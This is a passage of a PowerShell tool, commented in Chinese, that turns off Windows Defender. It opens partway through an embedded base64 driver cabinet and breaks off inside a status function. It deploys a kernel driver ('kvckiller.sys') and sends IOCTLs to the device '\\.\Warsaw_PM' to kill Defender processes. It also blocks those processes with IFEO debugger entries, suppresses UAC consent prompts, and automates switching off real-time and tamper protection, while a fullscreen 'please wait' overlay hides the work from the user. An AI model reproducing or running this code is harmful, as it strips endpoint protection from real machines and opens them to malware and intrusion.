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
'@

# ============================================================================
# 常量
# ============================================================================

$DRV_SERVICE   = 'wsftprm'
$DRV_FILENAME  = 'kvckiller.sys'
$DRV_DEVICE    = '\\.\Warsaw_PM'
$DRV_IOCTL     = 0x22201C
$KILL_TARGETS  = @('MsMpEng.exe','SecurityHealthSystray.exe')

$UAC_REG_PATH       = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
$VOLATILE_KEY_PATH  = 'HKCU:\Software\Temp'
$KEY_NOT_EXISTED    = 0xFF

$IFEO_KEY        = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
$TEMP_HIVE_NAME  = 'TempIFEO'
$DEBUGGER_VALUE  = 'Debugger'
$DEBUGGER_PAYLOAD = 'systray.exe'
$IFEO_TARGETS    = @('MsMpEng.exe','SecurityHealthSystray.exe','SecurityHealthService.exe')

# ============================================================================
# P/Invoke - kernel32（CreateFile + DeviceIoControl）+ user32（v1.0 的 UI 操作）
# ============================================================================

Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class WinAPI {
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess,
        uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
        uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool DeviceIoControl(IntPtr hDevice, uint ioControlCode,
        byte[] inBuffer, uint inBufferSize, IntPtr outBuffer, uint outBufferSize,
        out uint bytesReturned, IntPtr overlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern int GetClassName(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    public static extern bool IsWindowVisible(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern bool IsWindow(IntPtr hWnd);

    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    public const uint GENERIC_READ        = 0x80000000;
    public const uint GENERIC_WRITE       = 0x40000000;
    public const uint OPEN_EXISTING       = 3;
    public const uint FILE_ATTR_NORMAL    = 0x80;
    public const uint WM_SYSCOMMAND       = 0x0112;
    public const uint SC_CLOSE            = 0xF060;
    public const uint WM_CLOSE            = 0x0010;
    public const int  SW_SHOWMINNOACTIVE  = 7;
}
"@ -ErrorAction Stop

$INVALID_HANDLE = [IntPtr]::new(-1)

# ============================================================================
# 覆盖层 —— 无边框置顶 "请稍候" 窗口
# ============================================================================

$script:Overlay      = $null
$script:OverlayLabel = $null
$script:OverlayTimer = $null
$script:OverlayPhase = 0

function Show-PleaseWait {
    if ($null -ne $script:Overlay) { return }

    # 合并所有显示器边界 -> 虚拟屏幕矩形
    $bounds = [System.Drawing.Rectangle]::Empty
    foreach ($s in [System.Windows.Forms.Screen]::AllScreens) {
        $bounds = [System.Drawing.Rectangle]::Union($bounds, $s.Bounds)
    }

    $f = New-Object System.Windows.Forms.Form
    $f.FormBorderStyle = 'None'
    $f.StartPosition   = 'Manual'
    $f.Location        = $bounds.Location
    $f.Size            = $bounds.Size
    $f.BackColor       = [System.Drawing.Color]::Black
    $f.TopMost         = $true
    $f.ShowInTaskbar   = $false
    $f.Opacity         = 1.0
    $f.Cursor          = [System.Windows.Forms.Cursors]::WaitCursor

    # 标签居中对齐主屏幕，而非虚拟桌面
    $primary = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $lblW = 600; $lblH = 100
    $lbl = New-Object System.Windows.Forms.Label
    $lbl.Text      = '请 稍 候'
    $lbl.ForeColor = [System.Drawing.Color]::White
    $lbl.Font      = New-Object System.Drawing.Font('Segoe UI', 36, [System.Drawing.FontStyle]::Bold)
    $lbl.TextAlign = 'MiddleCenter'
    $lbl.AutoSize  = $false
    $lbl.Size      = New-Object System.Drawing.Size($lblW, $lblH)
    # 相对于窗体原点定位（窗体起始于 $bounds.Location，可能为负数）
    $lbl.Location  = New-Object System.Drawing.Point(
        ($primary.X - $bounds.X + ($primary.Width  - $lblW) / 2),
        ($primary.Y - $bounds.Y + ($primary.Height - $lblH) / 2))
    $f.Controls.Add($lbl)

    $script:Overlay      = $f
    $script:OverlayLabel = $lbl
    $script:OverlayPhase = 0

    # 脉冲计时器 —— 正弦波在暗灰与亮白之间变化
    $t = New-Object System.Windows.Forms.Timer
    $t.Interval = 40   # ~25 FPS
    $t.Add_Tick({
        $script:OverlayPhase += 0.12
        # sin 值域 [-1..1] -> [0..1] -> [90..255] 灰度
        $level = [int](90 + 82.5 * (1 + [Math]::Sin($script:OverlayPhase)))
        if ($null -ne $script:OverlayLabel) {
            $script:OverlayLabel.ForeColor = [System.Drawing.Color]::FromArgb($level, $level, $level)
        }
    })
    $script:OverlayTimer = $t
    $t.Start()

    $f.Show()
    [System.Windows.Forms.Application]::DoEvents()
}

function Hide-PleaseWait {
    if ($null -ne $script:OverlayTimer) {
        $script:OverlayTimer.Stop()
        $script:OverlayTimer.Dispose()
        $script:OverlayTimer = $null
    }
    if ($null -ne $script:Overlay) {
        $script:Overlay.Close()
        $script:Overlay.Dispose()
        $script:Overlay = $null
        $script:OverlayLabel = $null
    }
}

function Pulse-Overlay {
    if ($null -ne $script:Overlay) {
        [System.Windows.Forms.Application]::DoEvents()
    }
}

# ============================================================================
# 注册表帮助函数（从 v1.0 移植）
# ============================================================================

function Read-RegistryDword {
    param([string]$Path, [string]$Name)
    try {
        if (Test-Path $Path) {
            $v = Get-ItemProperty -Path $Path -Name $Name -ErrorAction SilentlyContinue
            if ($null -ne $v) { return @{ Value = $v.$Name; Existed = $true } }
        }
    } catch { }
    return @{ Value = 0; Existed = $false }
}

function Write-RegistryDword {
    param([string]$Path, [string]$Name, [int]$Value)
    try {
        if (-not (Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
        Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type DWord -Force
        return $true
    } catch { return $false }
}

function Remove-RegistryValue {
    param([string]$Path, [string]$Name)
    try {
        if (Test-Path $Path) { Remove-ItemProperty -Path $Path -Name $Name -ErrorAction SilentlyContinue }
        return $true
    } catch { return $false }
}

# ============================================================================
# UAC 绕过 —— 将字节对编码到单个 DWORD 中（从 v1.0 移植）
# ============================================================================

function Encode-UACStatus {
    param([int]$CPBA, [bool]$CPBAExisted, [int]$POSD, [bool]$POSDExisted)
    $c = if ($CPBAExisted) { $CPBA -band 0xFF } else { $KEY_NOT_EXISTED }
    $p = if ($POSDExisted) { $POSD -band 0xFF } else { $KEY_NOT_EXISTED }
    return ($c -bor ($p -shl 8))
}

function Decode-UACStatus {
    param([int]$Encoded)
    $c = $Encoded -band 0xFF
    $p = ($Encoded -shr 8) -band 0xFF
    return @{
        CPBA = if ($c -ne $KEY_NOT_EXISTED) { $c } else { 0 }
        CPBAExisted = ($c -ne $KEY_NOT_EXISTED)
        POSD = if ($p -ne $KEY_NOT_EXISTED) { $p } else { 0 }
        POSDExisted = ($p -ne $KEY_NOT_EXISTED)
    }
}

function Backup-UAC {
    Write-Host '  [*] 正在备份并禁用 UAC 提示...'
    $cpba = Read-RegistryDword -Path $UAC_REG_PATH -Name 'ConsentPromptBehaviorAdmin'
    $posd = Read-RegistryDword -Path $UAC_REG_PATH -Name 'PromptOnSecureDesktop'
    $encoded = Encode-UACStatus -CPBA $cpba.Value -CPBAExisted $cpba.Existed -POSD $posd.Value -POSDExisted $posd.Existed
    if (-not (Write-RegistryDword -Path $UAC_REG_PATH -Name 'UACStatus' -Value $encoded)) { return $false }
    $ok = $true
    $ok = $ok -and (Write-RegistryDword -Path $UAC_REG_PATH -Name 'ConsentPromptBehaviorAdmin' -Value 0)
    $ok = $ok -and (Write-RegistryDword -Path $UAC_REG_PATH -Name 'PromptOnSecureDesktop' -Value 0)
    return $ok
}

function Restore-UAC {
    Write-Host '  [*] 正在恢复原始 UAC 设置...'
    $backup = Read-RegistryDword -Path $UAC_REG_PATH -Name 'UACStatus'
    if (-not $backup.Existed) { return $false }
    $d = Decode-UACStatus -Encoded $backup.Value
    if ($d.CPBAExisted) { Write-RegistryDword -Path $UAC_REG_PATH -Name 'ConsentPromptBehaviorAdmin' -Value $d.CPBA | Out-Null }
    else                { Remove-RegistryValue -Path $UAC_REG_PATH -Name 'ConsentPromptBehaviorAdmin' | Out-Null }
    if ($d.POSDExisted) { Write-RegistryDword -Path $UAC_REG_PATH -Name 'PromptOnSecureDesktop' -Value $d.POSD | Out-Null }
    else                { Remove-RegistryValue -Path $UAC_REG_PATH -Name 'PromptOnSecureDesktop' | Out-Null }
    Remove-RegistryValue -Path $UAC_REG_PATH -Name 'UACStatus' | Out-Null
    return $true
}

function Recover-UACIfNeeded {
    $b = Read-RegistryDword -Path $UAC_REG_PATH -Name 'UACStatus'
    if ($b.Existed) {
        Write-Host '  [恢复] 检测到残留 UAC 备份 —— 正在恢复'
        Restore-UAC | Out-Null
    }
}

# ============================================================================
# 冷启动检测 + 预热（从 v1.0 移植，使用 reg.exe 创建易失性注册表标记）
# ============================================================================

function Test-ColdBoot {
    try {
        $m = Get-ItemProperty -Path $VOLATILE_KEY_PATH -Name 'WinDefCtl_Warmed' -ErrorAction SilentlyContinue
        return ($null -eq $m)
    } catch { return $true }
}

function Set-WarmMarker {
    try {
        if (-not (Test-Path $VOLATILE_KEY_PATH)) { New-Item -Path $VOLATILE_KEY_PATH -Force | Out-Null }
        & reg add 'HKCU\Software\Temp' /v 'WinDefCtl_Warmed' /t REG_DWORD /d 1 /f | Out-Null
        return $true
    } catch { return $false }
}

# ============================================================================
# 窗口帮助函数（从 v1.0 移植）
# ============================================================================

function Find-SecurityWindow {
    param([int]$MaxRetries = 10)
    $script:foundWindow = $null
    for ($i = 0; $i -lt $MaxRetries; $i++) {
        $cb = [WinAPI+EnumWindowsProc] {
            param($hwnd, $lParam)
            $cn = New-Object System.Text.StringBuilder 256
            [WinAPI]::GetClassName($hwnd, $cn, 256) | Out-Null
            if ($cn.ToString() -eq 'ApplicationFrameWindow' -and [WinAPI]::IsWindowVisible($hwnd)) {
                $script:foundWindow = $hwnd
                return $false
            }
            return $true
        }
        [WinAPI]::EnumWindows($cb, [IntPtr]::Zero) | Out-Null
        if ($script:foundWindow) { return $script:foundWindow }
        Start-Sleep -Milliseconds 100
        Pulse-Overlay
    }
    return $null
}

function Close-SecurityWindow {
    param([IntPtr]$WindowHandle)
    if ($WindowHandle -eq [IntPtr]::Zero -or -not [WinAPI]::IsWindow($WindowHandle)) { return }
    [WinAPI]::SetForegroundWindow($WindowHandle) | Out-Null
    Start-Sleep -Milliseconds 100
    [WinAPI]::SendMessage($WindowHandle, [WinAPI]::WM_SYSCOMMAND, [IntPtr][WinAPI]::SC_CLOSE, [IntPtr]::Zero) | Out-Null
    for ($i = 0; $i -lt 30; $i++) {
        if (-not [WinAPI]::IsWindow($WindowHandle)) { return }
        Start-Sleep -Milliseconds 100
        Pulse-Overlay
    }
    [WinAPI]::SendMessage($WindowHandle, [WinAPI]::WM_CLOSE, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
    Start-Sleep -Milliseconds 1000
}

function Invoke-PreWarmDefender {
    Write-Host '  [*] 冷启动 —— 正在预热 Windows Defender...'
    Start-Process 'windowsdefender://threatsettings' -WindowStyle Hidden
    Start-Sleep -Milliseconds 800
    $h = Find-SecurityWindow -MaxRetries 10
    if ($h) {
        Start-Sleep -Milliseconds 800
        Close-SecurityWindow -WindowHandle $h
        Set-WarmMarker | Out-Null
        Write-Host '  [*] 预热完成'
    } else {
        Write-Host '  [警告] 未找到预热窗口，继续执行'
    }
}

# ============================================================================
# UI 自动化（从 v1.0 移植）
# ============================================================================

function Wait-UILoaded {
    param([System.Windows.Automation.AutomationElement]$RootElement, [int]$MaxRetries = 50)
    for ($i = 0; $i -lt $MaxRetries; $i++) {
        try {
            $d = $RootElement.FindAll([System.Windows.Automation.TreeScope]::Descendants,
                [System.Windows.Automation.Condition]::TrueCondition)
            if ($d.Count -gt 10) { return $true }
        } catch { }
        Start-Sleep -Milliseconds 100
        Pulse-Overlay
    }
    return $false
}

function Get-ElementCount {
    param([System.Windows.Automation.AutomationElement]$RootElement)
    try {
        return $RootElement.FindAll([System.Windows.Automation.TreeScope]::Descendants,
            [System.Windows.Automation.Condition]::TrueCondition).Count
    } catch { return 0 }
}

function Wait-StructureChange {
    param([System.Windows.Automation.AutomationElement]$RootElement, [int]$BaselineCount,
          [bool]$ExpectIncrease, [int]$TimeoutSeconds = 10)
    Write-Host '  [*] 正在等待 UI 更新...' -NoNewline
    for ($i = 0; $i -lt ($TimeoutSeconds * 10); $i++) {
        $c = Get-ElementCount -RootElement $RootElement
        $changed = if ($ExpectIncrease) { $c -gt $BaselineCount } else { $c -lt $BaselineCount }
        if ($changed) {
            Start-Sleep -Milliseconds 200
            $r = Get-ElementCount -RootElement $RootElement
            $stable = if ($ExpectIncrease) { $r -gt $BaselineCount } else { $r -lt $BaselineCount }
            if ($stable) { Write-Host ' [完成]'; return $true }
        }
        Start-Sleep -Milliseconds 100
        Pulse-Overlay
    }
    Write-Host ' [警告] 超时。'
    return $false
}

function Find-ToggleSwitch {
    param([System.Windows.Automation.AutomationElement]$RootElement, [bool]$Last = $false)
    $cond = New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::ControlTypeProperty,
        [System.Windows.Automation.ControlType]::Button)
    $buttons = $RootElement.FindAll([System.Windows.Automation.TreeScope]::Descendants, $cond)
    $found = $null
    foreach ($b in $buttons) {
        try {
            $p = $b.GetCurrentPattern([System.Windows.Automation.TogglePattern]::Pattern)
            if ($p) {
                if (-not $Last) { return $b }
                $found = $b
            }
        } catch { }
    }
    return $found
}

function Toggle-Switch {
    param([System.Windows.Automation.AutomationElement]$RootElement, [bool]$TurnOn, [bool]$LastToggle, [string]$Label)
    if (-not (Backup-UAC)) { return $false }
    $b = Find-ToggleSwitch -RootElement $RootElement -Last $LastToggle
    if (-not $b) { Restore-UAC | Out-Null; return $false }
    try {
        $tp = $b.GetCurrentPattern([System.Windows.Automation.TogglePattern]::Pattern)
        $state = $tp.Current.ToggleState
        $isOn = ($state -eq [System.Windows.Automation.ToggleState]::On)
        if ($TurnOn -and $isOn) {
            Write-Host "  [*] $Label 已启用"
            Restore-UAC | Out-Null; return $true
        }
        if ((-not $TurnOn) -and (-not $isOn)) {
            Write-Host "  [*] $Label 已禁用"
            Restore-UAC | Out-Null; return $true
        }
        $baseline = Get-ElementCount -RootElement $RootElement
        $tp.Toggle()
        # 开→关 会增加 UAC 对话框控件（+）；关→开 会移除它们（-）
        $expectIncrease = -not $TurnOn
        $r = Wait-StructureChange -RootElement $RootElement -BaselineCount $baseline -ExpectIncrease $expectIncrease
        Restore-UAC | Out-Null
        return $r
    } catch {
        Restore-UAC | Out-Null
        return $false
    }
}

function Get-ToggleStatus {
    param([System.Windows.Automation.AutomationElement]$RootElement, [bool]$LastToggle, [string]$Label)
    $b = Find-ToggleSwitch -RootElement $RootElement -Last $LastToggle
    if (-not $b) { return $null }
    try {
        $tp = $b.GetCurrentPattern([System.Windows.Automation.TogglePattern]::Pattern)
        $on = ($tp.Current.ToggleState -eq [System.Windows.Automation.ToggleState]::On)
        Write-Host "  [*] $Label 状态：$(if ($on) { '已启用' } else { '已禁用' })"
        return $on
    } catch { return $null }
}

# ----------------------------------------------------------------------------
#  四种 UI 流程的包装函数（rtp on/off, tp on/off）
# ----------------------------------------------------------------------------

function Invoke-DefenderUI {
    param([string]$Cmd, [string]$Act)
    Show-PleaseWait
    Recover-UACIfNeeded
    Write-Host '  [*] 正在打开 Windows Defender...'
    if (Test-ColdBoot) { Invoke-PreWarmDefender; Start-Sleep -Milliseconds 800 }

    Start-Process 'windowsdefender://threatsettings' -WindowStyle Hidden
    $hwnd = Find-SecurityWindow -MaxRetries 10
    if (-not $hwnd) { Hide-PleaseWait; Write-Host '  [错误] 找不到 Windows 安全中心窗口' -F Red; return 1 }

    try {
        $root = [System.Windows.Automation.AutomationElement]::FromHandle($hwnd)
    } catch {
        Close-SecurityWindow -WindowHandle $hwnd
        Hide-PleaseWait
        Write-Host '  [错误] FromHandle 失败' -F Red
        return 1
    }

    if (-not (Wait-UILoaded -RootElement $root -MaxRetries 50)) {
        Close-SecurityWindow -WindowHandle $hwnd
        Hide-PleaseWait
        Write-Host '  [错误] UI 加载超时' -F Red
        return 1
    }

    # RTP = 第一个切换开关，TP = 最后一个切换开关
    $isTP = ($Cmd -eq 'tp')
    $label = if ($isTP) { '篡改保护' } else { '实时保护' }
    $ok = $false
    switch ($Act) {
        'status' { $ok = ((Get-ToggleStatus -RootElement $root -LastToggle $isTP -Label $label) -ne $null) }
        'on'     { $ok = Toggle-Switch -RootElement $root -TurnOn $true  -LastToggle $isTP -Label $label }
        'off'    { $ok = Toggle-Switch -RootElement $root -TurnOn $false -LastToggle $isTP -Label $label }
    }
    Close-SecurityWindow -WindowHandle $hwnd
    Hide-PleaseWait
    return $(if ($ok) { 0 } else { 1 })
}

# ============================================================================
# 驱动解压（CAB Base64 -> %TEMP%\kk.cab -> expand.exe -> drivers\）
# ============================================================================

function Extract-Driver {
    $cabBytes = [Convert]::FromBase64String($DriverCabB64)
    $cabFile = Join-Path $env:TEMP 'kk.cab'
    [IO.File]::WriteAllBytes($cabFile, $cabBytes)

    $dst = Join-Path $env:SystemRoot "System32\drivers\$DRV_FILENAME"
    # expand.exe 在源文件为单个命名条目时需要指定目标文件
    & expand.exe "$cabFile" "-F:$DRV_FILENAME" "$dst" *>$null
    $ec = $LASTEXITCODE
    Remove-Item $cabFile -Force -EA SilentlyContinue

    if ($ec -ne 0 -or -not (Test-Path $dst)) {
        Write-Host "  [错误] expand.exe 失败（退出码 $ec）—— 驱动未写入" -F Red
        return $null
    }

    Write-Host "  [+] $DRV_FILENAME 已部署到 drivers\（$((Get-Item $dst).Length) 字节）"
    return $dst
}

function Remove-DriverFile {
    $dst = Join-Path $env:SystemRoot "System32\drivers\$DRV_FILENAME"
    Remove-Item $dst -Force -EA SilentlyContinue
}

# ============================================================================
# SCM 生命周期（sc.exe）
# ============================================================================

function Install-KillerService {
    param([string]$BinPath)
    & sc.exe create $DRV_SERVICE type= kernel start= demand error= normal binPath= "$BinPath" DisplayName= "$DRV_SERVICE" | Out-Null
    return ($LASTEXITCODE -eq 0)
}

function Start-KillerService {
    & sc.exe start $DRV_SERVICE | Out-Null
    if ($LASTEXITCODE -eq 0) { return $true }
    # ERROR_SERVICE_ALREADY_RUNNING (1056) 视为成功
    return ($LASTEXITCODE -eq 1056)
}

function Stop-KillerService {
    & sc.exe stop $DRV_SERVICE | Out-Null
    Start-Sleep -Milliseconds 300
    & sc.exe delete $DRV_SERVICE | Out-Null
}

# ============================================================================
# IOCTL 终止（CreateFile + DeviceIoControl，按 PID）
# ============================================================================

function Kill-DefenderProcs {
    $h = [WinAPI]::CreateFileW($DRV_DEVICE,
        ([WinAPI]::GENERIC_READ -bor [WinAPI]::GENERIC_WRITE),
        0, [IntPtr]::Zero, [WinAPI]::OPEN_EXISTING, [WinAPI]::FILE_ATTR_NORMAL, [IntPtr]::Zero)
    if ($h -eq $INVALID_HANDLE) {
        Write-Host '  [错误] 无法打开 \\.\Warsaw_PM' -F Red
        return $false
    }

    $any = $false
    foreach ($name in $KILL_TARGETS) {
        $procs = @(Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($name)) -EA SilentlyContinue)
        foreach ($p in $procs) {
            $buf = New-Object byte[] 1036
            [BitConverter]::GetBytes([uint32]$p.Id).CopyTo($buf, 0)
            $ret = 0
            $ok = [WinAPI]::DeviceIoControl($h, $DRV_IOCTL, $buf, 1036, [IntPtr]::Zero, 0, [ref]$ret, [IntPtr]::Zero)
            if ($ok) {
                Write-Host "  [+] $name (PID $($p.Id)) 已终止"
                $any = $true
            } else {
                Write-Host "  [-] IOCTL 失败，$name PID $($p.Id)（错误码 $([Runtime.InteropServices.Marshal]::GetLastWin32Error())）"
            }
        }
    }
    [WinAPI]::CloseHandle($h) | Out-Null
    return $any
}

# ============================================================================
# IFEO 配置单元操作（reg.exe —— 自行提升 SE_BACKUP/SE_RESTORE 权限）
# ============================================================================

function Invoke-Reg { param([string[]]$RegArgs)
    & reg.exe @RegArgs *>$null
    return $LASTEXITCODE
}

function Set-IFEOBlock {
    param([bool]$AddBlock)
    $hivePath = Join-Path $env:TEMP 'Ifeo.hiv'
    Remove-Item $hivePath -Force -EA SilentlyContinue
    Remove-Item ("$hivePath.LOG1") -Force -EA SilentlyContinue
    Remove-Item ("$hivePath.LOG2") -Force -EA SilentlyContinue

    # 若上次崩溃后仍加载，则先卸载
    Invoke-Reg @('unload', "HKLM\$TEMP_HIVE_NAME") | Out-Null

    # 快照当前 IFEO
    if ((Invoke-Reg @('save', "HKLM\$IFEO_KEY", $hivePath, '/y')) -ne 0) {
        Write-Host '  [!] reg save IFEO 失败' -F Red; return $false
    }

    # 以合成名称加载，以便修改
    if ((Invoke-Reg @('load', "HKLM\$TEMP_HIVE_NAME", $hivePath)) -ne 0) {
        Write-Host '  [!] reg load TempIFEO 失败' -F Red; return $false
    }

    foreach ($t in $IFEO_TARGETS) {
        $sub = "HKLM\$TEMP_HIVE_NAME\$t"
        if ($AddBlock) {
            Invoke-Reg @('add', $sub, '/v', $DEBUGGER_VALUE, '/t', 'REG_SZ', '/d', $DEBUGGER_PAYLOAD, '/f') | Out-Null
        } else {
            Invoke-Reg @('delete', $sub, '/v', $DEBUGGER_VALUE, '/f') | Out-Null
            Invoke-Reg @('delete', $sub, '/f') | Out-Null
        }
    }

    Invoke-Reg @('unload', "HKLM\$TEMP_HIVE_NAME") | Out-Null

    # 恢复（REG_FORCE_RESTORE）—— 需要 /f
    if ((Invoke-Reg @('restore', "HKLM\$IFEO_KEY", $hivePath, '/f')) -ne 0) {
        Write-Host '  [!] reg restore IFEO 失败' -F Red
        Remove-Item $hivePath,"$hivePath.LOG1","$hivePath.LOG2" -Force -EA SilentlyContinue
        return $false
    }

    Remove-Item $hivePath,"$hivePath.LOG1","$hivePath.LOG2" -Force -EA SilentlyContinue
    return $true
}

# ============================================================================
# KILL 流程
# ============================================================================

function Invoke-Kill {
    Show-PleaseWait

    Write-Host '  [*] 正在从嵌入式 CAB 解压 kvckiller.sys...'
    $drv = Extract-Driver
    if (-not $drv) { Hide-PleaseWait; return 1 }

    Write-Host '  [*] 正在应用 IFEO 阻止（MsMpEng + SecurityHealth*）...'
    Set-IFEOBlock -AddBlock $true | Out-Null

    Write-Host "  [*] 正在安装服务 $DRV_SERVICE ..."
    if (-not (Install-KillerService -BinPath $drv)) {
        Write-Host '  [!] sc create 失败' -F Red
        Remove-DriverFile
        Hide-PleaseWait
        return 1
    }
    if (-not (Start-KillerService)) {
        Write-Host '  [!] sc start 失败' -F Red
        & sc.exe delete $DRV_SERVICE | Out-Null
        Remove-DriverFile
        Hide-PleaseWait
        return 1
    }

    Write-Host '  [*] 正在发送 IOCTL 终止命令...'
    Kill-DefenderProcs | Out-Null

    # SCM 停止 SecurityHealthService
    & sc.exe stop SecurityHealthService | Out-Null

    Write-Host '  [*] 清理：停止并删除服务，移除驱动文件...'
    Stop-KillerService
    Remove-DriverFile

    Hide-PleaseWait
    Write-Host '  [*] 完成。Defender 已被阻止。' -F Green
    return 0
}

# ============================================================================
# RESTORE 流程
# ============================================================================

function Invoke-Restore {
    Show-PleaseWait
    Recover-UACIfNeeded

    Write-Host '  [*] 正在移除 IFEO 阻止...'
    Set-IFEOBlock -AddBlock $false | Out-Null

    Write-Host '  [*] 正在启动 WinDefend...'
    & sc.exe start WinDefend | Out-Null

    Write-Host '  [*] 正在启动 SecurityHealthService...'
    & sc.exe start SecurityHealthService | Out-Null

    Write-Host '  [*] 正在启动 SecurityHealthSystray...'
    Start-Process (Join-Path $env:SystemRoot 'System32\SecurityHealthSystray.exe') -EA SilentlyContinue | Out-Null

    Hide-PleaseWait
    Write-Host '  [*] 完成。Defender 已恢复。' -F Green
    return 0
}

# ============================================================================
# STATUS
# ============================================================================

function Invoke-Status {
    Write-Host ''
    Write-Host '  === Windows Defender 状态 ===' -F Cyan

    $ifeoSub = "HKLM:\$IFEO_KEY\MsMpEng.exe"
    $ifeoBlocked = $false
    if (Test-Path $ifeoSub) {
        $v = Get-ItemProperty -Path $ifeoSub -Name 'Debugger' -EA SilentlyContinue
        if ($v -and $v.Debugger) { $ifeoBlocked = $true }
    }

    $wd = Get-Service -Name WinDefend -EA SilentlyContinue
    $sh = Get-Service -Name SecurityHealthService -EA SilentlyContinue
